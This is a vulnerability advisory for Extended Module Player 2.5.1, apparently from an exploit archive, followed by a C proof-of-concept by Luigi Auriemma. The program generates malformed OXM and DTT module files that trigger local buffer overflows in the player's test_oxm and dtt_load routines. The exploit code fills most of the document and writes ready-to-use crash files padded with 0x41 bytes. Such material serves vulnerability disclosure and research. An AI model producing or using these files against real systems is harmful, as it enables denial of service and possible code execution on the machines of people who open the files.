@@ -1,0 +1,157 @@
+source: http://www.securityfocus.com/bid/27047/info
+
+Extended Module Player (xmp) is prone to multiple local buffer-overflow vulnerabilities because it fails to perform adequate boundary checks before copying user-supplied input into an insufficiently sized buffer.
+
+These issues occur when the application handles specially crafted OXM and DTT files.
+
+Attackers can exploit these issues to execute arbitrary code that could compromise the affected computer. Failed attacks will likely cause denial-of-service conditions.
+
+Extended Media Player 2.5.1 is vulnerable; other versions may also be affected. 
+
+/*
+
+by Luigi Auriemma
+
+*/
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+
+
+#define VER     "0.1"
+#define BUFFSZ  8192
+#define BOFCHR  0x41414141
+#define BOF1SZ  380
+#define BOF2SZ  3000
+#define u8      unsigned char
+
+
+
+int putmm(u8 *data, u8 *src, int len);
+int putxx(u8 *data, unsigned num, int bits);
+void std_err(void);
+
+
+
+int main(int argc, char *argv[]) {
+    FILE    *fd;
+    int     i,
+            attack;
+    u8      buff[BUFFSZ],
+            *fname,
+            *p;
+
+    setbuf(stdout, NULL);
+
+    fputs("\n"
+        "Extended Module Player <= 2.5.1 buffer-overflow "VER"\n"
+        "by Luigi Auriemma\n"
+        "e-mail: aluigi@autistici.org\n"
+        "web:    aluigi.org\n"
+        "\n", stdout);
+
+    if(argc < 3) {
+        printf("\n"
+            "Usage: %s <attack> <output_file>\n"
+            "\n"
+            "Attack:\n"
+            " 1 = test_oxm, only *nix XMP reads this format (*.OXM)\n"
+            " 2 = dtt_load (*.DTT)\n"
+            "\n", argv[0]);
+        exit(1);
+    }
+
+    attack = atoi(argv[1]);
+    fname  = argv[2];
+
+    p = buff;
+
+    if(attack == 1) {
+        printf("- test_oxm\n");
+
+        p += putmm(p, "Extended Module:", 16);
+        p += putmm(p, "",       60 - 16);
+        p += putxx(p, 14,       32);    // hlen
+        p += putmm(p, "",       6);
+        p += putxx(p, 0,        16);    // npat
+        p += putxx(p, 1,        16);    // nins
+        p += putxx(p, -1,       32);    // ilen
+        for(i = 0; i < 32; i++) {
+            *p++ = 0xff;                // buf + 27 (nsmp)
+        }                               // force return
+        for(i = 0; i < BOF2SZ; i++) {
+            *p++ = BOFCHR & 0xff;       // buf
+        }
+
+    } else if(attack == 2) {
+        printf("- dtt_load\n");
+
+        p += putxx(p, 'D',      8);
+        p += putxx(p, 's',      8);
+        p += putxx(p, 'k',      8);
+        p += putxx(p, 'T',      8);
+        p += putmm(p, "name",   64);
+        p += putmm(p, "author", 64);
+        p += putxx(p, 0,        32);    // flags
+        p += putxx(p, 0,        32);    // m->xxh->chn
+        p += putxx(p, 0,        32);    // m->xxh->len
+        p += putmm(p, "",       8);     // buf
+        p += putxx(p, 0,        32);    // m->xxh->tpo
+        p += putxx(p, 0,        32);    // m->xxh->rst
+        p += putxx(p, BOF1SZ,   32);    // m->xxh->pat
+        p += putxx(p, 0,        32);    // m->xxh->ins = m->xxh->smp
+        p += putmm(p, "",       3);     // fread(m->xxo, 1, (m->xxh->len 
++ 3) & ~3L, f);
+        for(i = 0; i < BOF1SZ; i++) {
+            p += putxx(p, BOFCHR, 32);  // first buffer-overflow
+        }
+        for(i = 0; i < (((BOF1SZ + 3) >> 2) << 2); i++) {
+            *p++ = BOFCHR & 0xff;       // second buffer-overflow
+        }
+
+    } else {
+        printf("\nError: wrong attack number (%d)\n", attack);
+        exit(1);
+    }
+
+    printf("- create file %s\n", fname);
+    fd = fopen(fname, "wb");
+    if(!fd) std_err();
+    fwrite(buff, 1, p - buff, fd);
+    fclose(fd);
+    printf("- done\n");
+    return(0);
+}
+
+
+
+int putmm(u8 *data, u8 *src, int len) {
+    strncpy(data, src, len);
+    return(len);
+}
+
+
+
+int putxx(u8 *data, unsigned num, int bits) {
+    int     i,
+            bytes;
+
+    bytes = bits >> 3;
+
+    for(i = 0; i < bytes; i++) {
+        data[i] = (num >> (i << 3)) & 0xff;
+    }
+    return(bytes);
+}
+
+
+
+void std_err(void) {
+    perror("\nError");
+    exit(1);
+}
+
+
+
